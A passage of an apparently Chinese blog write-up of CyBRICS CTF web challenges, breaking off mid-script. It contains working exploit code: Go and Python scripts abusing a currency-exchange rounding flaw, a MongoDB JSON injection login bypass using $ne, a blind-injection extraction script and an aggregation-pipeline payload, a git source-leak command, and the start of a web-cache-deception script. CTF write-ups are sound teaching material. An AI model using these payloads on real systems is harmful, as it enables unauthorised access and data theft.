    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>又是摸鱼的一天</p><h2 id="0x01-Bitkoff-Bank-Web-Easy-50-pts"><a href="#0x01-Bitkoff-Bank-Web-Easy-50-pts" class="headerlink" title="0x01 Bitkoff Bank (Web, Easy, 50 pts)"></a>0x01 Bitkoff Bank (Web, Easy, 50 pts)</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>Author: Alexander Menshchikov (n0str)</p><p>Need more money! Need the flag!</p><h3 id="题目解答"><a href="#题目解答" class="headerlink" title="题目解答"></a>题目解答</h3><p>方法一：耗时较长但是操作简单</p><ol><li>将btc兑换为usd</li><li>购买自动挖btc的机器人</li><li>burp多线程跟着挖</li></ol><p>几个小时之后就可以得到flag了。&lt;–我的解法 (x_x)</p><p>方法二：逻辑兑换问题</p><ol><li>btc-&gt;usd</li><li>usd-&gt;btc</li></ol><p>这个流程走完会发现btc就变多了，这样兑换个几百次就可以得到flag。</p><p>之所以会想到这点：</p><ol><li>尝试兑换</li><li>前端提示了对浮点数的处理，但是后端并没有对其进行限制。</li></ol><p>别的师傅的解法–&gt;</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"io/ioutil"</span></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line"><span class="string">"regexp"</span></span><br><span class="line"><span class="string">"strings"</span></span><br><span class="line"><span class="string">"sync"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> url = <span class="string">"http://95.179.148.72:8083/index.php"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"><span class="keyword">go</span> btc2usd(<span class="string">"0.00009"</span>, <span class="literal">true</span>)</span><br><span class="line"><span class="keyword">for</span> j:=<span class="number">0</span>; j &lt; <span class="number">100</span>; j++ &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">1</span>; i++ &#123;</span><br><span class="line"><span class="keyword">go</span> usd2btc(<span class="string">"0.9"</span>, &amp;wg)</span><br><span class="line">&#125;</span><br><span class="line">wg.Wait()</span><br><span class="line">_, b := getmoney()</span><br><span class="line">btc2usd(b, <span class="literal">false</span>)</span><br><span class="line">fmt.Println(getmoney())</span><br><span class="line">&#125;</span><br><span class="line">_, b := getmoney()</span><br><span class="line">btc2usd(b, <span class="literal">false</span>)</span><br><span class="line">fmt.Println(getmoney())</span><br><span class="line">fmt.Println(<span class="string">"done"</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getmoney</span><span class="params">()</span> <span class="params">(<span class="keyword">string</span>, <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">client := &amp;http.Client&#123;&#125;</span><br><span class="line">req,_ := http.NewRequest(<span class="string">"POST"</span>,url,strings.NewReader(<span class="string">""</span>))</span><br><span class="line">req.Header.Set(<span class="string">"Content-Type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>)</span><br><span class="line">req.Header.Set(<span class="string">"Cookie"</span>,<span class="string">"name=catcat; password=catcat"</span>)</span><br><span class="line">resp2, _ := client.Do(req)</span><br><span class="line">body, _ := ioutil.ReadAll(resp2.Body)</span><br><span class="line">r := regexp.MustCompile(<span class="string">"Your USD: &lt;b&gt;(.*)&lt;/b&gt;&lt;br&gt;Your"</span>)</span><br><span class="line">usd := r.FindStringSubmatch(<span class="keyword">string</span>(body))[<span class="number">1</span>]</span><br><span class="line">r = regexp.MustCompile(<span class="string">"&gt;Your BTC: &lt;b&gt;(.*)&lt;/b&gt;&lt;br&gt;"</span>)</span><br><span class="line">btc := r.FindStringSubmatch(<span class="keyword">string</span>(body))[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">return</span> usd, btc</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">btc2usd</span><span class="params">(amount <span class="keyword">string</span>, l <span class="keyword">bool</span>)</span></span> &#123;</span><br><span class="line">client := &amp;http.Client&#123;&#125;</span><br><span class="line">req,_ := http.NewRequest(<span class="string">"POST"</span>,url,strings.NewReader(<span class="string">"from_currency=btc&amp;to_currency=usd&amp;amount="</span>+amount))</span><br><span class="line">req.Header.Set(<span class="string">"Content-Type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>)</span><br><span class="line">req.Header.Set(<span class="string">"Cookie"</span>,<span class="string">"name=catcat; password=catcat"</span>)</span><br><span class="line"><span class="keyword">if</span> l == <span class="literal">true</span> &#123;</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">client.Do(req)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">client.Do(req)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">usd2btc</span><span class="params">(amount <span class="keyword">string</span>, wg *sync.WaitGroup)</span></span> &#123;</span><br><span class="line">wg.Add(<span class="number">1</span>)</span><br><span class="line">client := &amp;http.Client&#123;&#125;</span><br><span class="line">req,_ := http.NewRequest(<span class="string">"POST"</span>,url,strings.NewReader(<span class="string">"from_currency=usd&amp;to_currency=btc&amp;amount="</span>+amount))</span><br><span class="line">req.Header.Set(<span class="string">"Content-Type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>)</span><br><span class="line">req.Header.Set(<span class="string">"Cookie"</span>,<span class="string">"name=catcat; password=catcat"</span>)</span><br><span class="line">client.Do(req)</span><br><span class="line">wg.Done()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://95.179.148.72:8083/index.php'</span></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randstr</span><span class="params">(length=<span class="number">8</span>)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(random.sample(string.ascii_letters + string.digits, length))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(s,url)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=s.get(url,timeout=<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">if</span> r.status_code != <span class="number">500</span>:</span><br><span class="line">                <span class="keyword">return</span> r</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(s,url,data)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=s.post(url,data=data,timeout=<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">if</span> r.status_code != <span class="number">500</span>:</span><br><span class="line">                <span class="keyword">return</span> r</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg_login</span><span class="params">(s,url,un,pw)</span>:</span></span><br><span class="line">    payload=&#123;<span class="string">'name'</span>:un,<span class="string">'password'</span>:pw&#125;</span><br><span class="line">    r=post(s,url,payload)</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(s,url,fr,to,am)</span>:</span></span><br><span class="line">    payload=&#123;<span class="string">'from_currency'</span>:fr,<span class="string">'to_currency'</span>:to,<span class="string">'amount'</span>:am&#125;</span><br><span class="line">    r=post(s,url,payload)</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line">un=randstr()</span><br><span class="line">pw=randstr()</span><br><span class="line"><span class="keyword">print</span> un</span><br><span class="line"><span class="keyword">print</span> pw</span><br><span class="line">reg_login(s,url,un,pw)</span><br><span class="line">reg_login(s,url,un,pw)</span><br><span class="line">change(s,url,<span class="string">'btc'</span>,<span class="string">'usd'</span>,<span class="string">'0.00003'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    res=get(s,url)</span><br><span class="line">    usd=res.text.split(<span class="string">': &lt;b&gt;'</span>)[<span class="number">1</span>].split(<span class="string">'&lt;/b&gt;'</span>)[<span class="number">0</span>]</span><br><span class="line">    btc=res.text.split(<span class="string">': &lt;b&gt;'</span>)[<span class="number">2</span>].split(<span class="string">'&lt;/b&gt;'</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">print</span> float(usd)</span><br><span class="line">    <span class="keyword">if</span> float(usd)&gt;=<span class="number">1.0</span>: <span class="keyword">break</span></span><br><span class="line">    change(s,url,<span class="string">'usd'</span>,<span class="string">'btc'</span>,usd)</span><br><span class="line">    res=get(s,url)</span><br><span class="line">    usd=res.text.split(<span class="string">': &lt;b&gt;'</span>)[<span class="number">1</span>].split(<span class="string">'&lt;/b&gt;'</span>)[<span class="number">0</span>]</span><br><span class="line">    btc=res.text.split(<span class="string">': &lt;b&gt;'</span>)[<span class="number">2</span>].split(<span class="string">'&lt;/b&gt;'</span>)[<span class="number">0</span>]</span><br><span class="line">    change(s,url,<span class="string">'btc'</span>,<span class="string">'usd'</span>,btc)</span><br></pre></td></tr></table></figure><p>flag:cybrics{50_57R4n93_pR3c1510n} </p><h2 id="0x02-NopeSQL-Web-Medium-156-pts"><a href="#0x02-NopeSQL-Web-Medium-156-pts" class="headerlink" title="0x02 NopeSQL (Web, Medium, 156 pts)"></a>0x02 NopeSQL (Web, Medium, 156 pts)</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>Author: Alexander Menshchikov (n0str)</p><p>Maybe you can login and find unusual secret news</p><p><a href="http://173.199.118.226/" target="_blank" rel="noopener">http://173.199.118.226/</a></p><h3 id="题目解答-1"><a href="#题目解答-1" class="headerlink" title="题目解答"></a>题目解答</h3><ol><li>git泄露源码（假的404）</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http://173.199.118.226/.git/</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">"/vendor/autoload.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">    $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;users;</span><br><span class="line">    $raw_query = <span class="string">'&#123;"username": "'</span>.$username.<span class="string">'", "password": "'</span>.$password.<span class="string">'"&#125;'</span>;</span><br><span class="line">    $document = $collection-&gt;findOne(json_decode($raw_query));</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($document) &amp;&amp; <span class="keyword">isset</span>($document-&gt;password)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $user = auth($_COOKIE[<span class="string">'username'</span>], $_COOKIE[<span class="string">'password'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $user = auth($_POST[<span class="string">'username'</span>], $_POST[<span class="string">'password'</span>]);</span><br><span class="line">    <span class="keyword">if</span> ($user) &#123;</span><br><span class="line">        setcookie(<span class="string">'username'</span>, $_POST[<span class="string">'username'</span>]);</span><br><span class="line">        setcookie(<span class="string">'password'</span>, $_POST[<span class="string">'password'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> ($user == <span class="keyword">true</span>): <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    Welcome!</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        Group most common news by</span><br><span class="line">        &lt;a href=<span class="string">"?filter=$category"</span>&gt;category&lt;/a&gt; | </span><br><span class="line">        &lt;a href=<span class="string">"?filter=$public"</span>&gt;publicity&lt;/a&gt;&lt;br&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        $filter = $_GET[<span class="string">'filter'</span>];</span><br><span class="line"></span><br><span class="line">        $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;news;</span><br><span class="line"></span><br><span class="line">        $pipeline = [</span><br><span class="line">            [<span class="string">'$group'</span> =&gt; [<span class="string">'_id'</span> =&gt; <span class="string">'$category'</span>, <span class="string">'count'</span> =&gt; [<span class="string">'$sum'</span> =&gt; <span class="number">1</span>]]],</span><br><span class="line">            [<span class="string">'$sort'</span> =&gt; [<span class="string">'count'</span> =&gt; <span class="number">-1</span>]],</span><br><span class="line">            [<span class="string">'$limit'</span> =&gt; <span class="number">5</span>],</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $filters = [</span><br><span class="line">            [<span class="string">'$project'</span> =&gt; [<span class="string">'category'</span> =&gt; $filter]]</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $cursor = $collection-&gt;aggregate(array_merge($filters, $pipeline));</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($filter)): <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">            <span class="keyword">foreach</span> ($cursor <span class="keyword">as</span> $category) &#123;</span><br><span class="line">                    printf(<span class="string">"%s has %d news&lt;br&gt;"</span>, $category[<span class="string">'_id'</span>], $category[<span class="string">'count'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">else</span>: <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])): <span class="meta">?&gt;</span></span><br><span class="line">        Invalid username <span class="keyword">or</span> password</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;form action=<span class="string">'/'</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"text"</span> name=<span class="string">"username"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"submit"</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h2&gt;News&lt;/h2&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;news;</span><br><span class="line">        $cursor = $collection-&gt;find([<span class="string">'public'</span> =&gt; <span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">foreach</span> ($cursor <span class="keyword">as</span> $news) &#123;</span><br><span class="line">            printf(<span class="string">"%s&lt;br&gt;"</span>, $news[<span class="string">'title'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>从代码中可以看到是通过运行mongodb语句进行查询，那么就可以构造如下语句来bypass auth。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: &quot;,&quot;password&quot;:&#123;&quot;$ne&quot;:null&#125;,&quot;username&quot;:&quot;admin</span><br></pre></td></tr></table></figure><p>拼接之后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$raw_query = &#123;&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;&quot;,&quot;password&quot;:&#123;&quot;$ne&quot;:null&#125;,&quot;username&quot;:&quot;admin&quot;&#125;;</span><br></pre></td></tr></table></figure></p><p>PS: $ne是不等于的意思。而且虽然变量重复了，但是decode时变量只会是最后一次的赋值。</p><p>登录之后就就会发现很明显是要从<code>filter</code>参数处构造注入来获取flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://173.199.118.226/index.php?filter[$gt][0]=$text&amp;filter[$gt][1]=注入点</span><br></pre></td></tr></table></figure><p>但是这里我还是不清楚这个二维数组的意思，所以后期需要调试一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://173.199.118.226/index.php?filter[$gt][0]=$text&amp;filter[$gt][1]="</span></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">"username"</span>: <span class="string">"admin"</span>,</span><br><span class="line">    <span class="string">"password"</span>: <span class="string">'","password":&#123;"$ne":null&#125;,"username":"admin'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = <span class="string">"cybrics&#123;7"</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        s = chr(i)</span><br><span class="line">        <span class="comment"># print s</span></span><br><span class="line">        r = requests.get(url+res+s, cookies=cookie)</span><br><span class="line">        <span class="comment"># print r.text</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"1 has"</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            res += chr(i<span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"-----&gt;"</span>,res</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>这是盲注型解法，后面还看到有师傅用<a href="https://docs.mongodb.com/manual/reference/operator/aggregation-pipeline/" target="_blank" rel="noopener">聚合管道</a>直接构造出了payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?filter[$cond][if][$eq][][$strLenBytes]=$title&amp;filter[$cond][if][$eq][][$toInt]=19&amp;filter[$cond][then]=$text&amp;filter[$cond][else]=12</span><br></pre></td></tr></table></figure><p>flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cybrics&#123;7|-|15 15 4 7E&gt;&lt;7 |=|_49&#125;</span><br></pre></td></tr></table></figure></p><h2 id="0x03-Caesaref-Web-Hard-50-pts"><a href="#0x03-Caesaref-Web-Hard-50-pts" class="headerlink" title="0x03 Caesaref (Web, Hard, 50 pts)"></a>0x03 Caesaref (Web, Hard, 50 pts)</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>Author: Alexander Menshchikov (n0str)</p><p>There is an additional one: Fixaref</p><p>This web resource is highly optimized:</p><p><a href="http://45.77.218.242/" target="_blank" rel="noopener">http://45.77.218.242/</a></p><h3 id="题目解答-2"><a href="#题目解答-2" class="headerlink" title="题目解答"></a>题目解答</h3><p>题目出现问题，bot直接带cookie访问了，所以可以轻松拿到cookie，之后带cookie访问目标即可。</p><h2 id="0x04-Fixaref-Web-Hard-267-pts"><a href="#0x04-Fixaref-Web-Hard-267-pts" class="headerlink" title="0x04 Fixaref (Web, Hard, 267 pts)"></a>0x04 Fixaref (Web, Hard, 267 pts)</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>Author: Alexander Menshchikov (n0str)</p><p>Caesaref recently suffered from a massive data breach. It was so critical that they decided to just start over. Here it goes — Fixaref: “Reliability is Our Game”™®.</p><p>This web resource is even more highly optimized:</p><p><a href="http://95.179.190.31/" target="_blank" rel="noopener">http://95.179.190.31/</a></p><h3 id="题目解答-3"><a href="#题目解答-3" class="headerlink" title="题目解答"></a>题目解答</h3><ol><li>就是css文件会被缓存</li><li>由于网站路由配置不当，导致可以将某些页面后缀变成css，然后就被缓存了。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://95.179.190.31/"</span></span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line"><span class="string">"Cookie"</span>: <span class="string">"PHPSESSID=nsce9ed7evs05iisp8u0hb41r6"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getToken</span><span class="params">(text)</span>:</span></span><br><span class="line">tmp = re.search(<span class="string">'value="([a-z0-9]&#123;64&#125;)"'</span>, text)</span><br><span class="line"><span 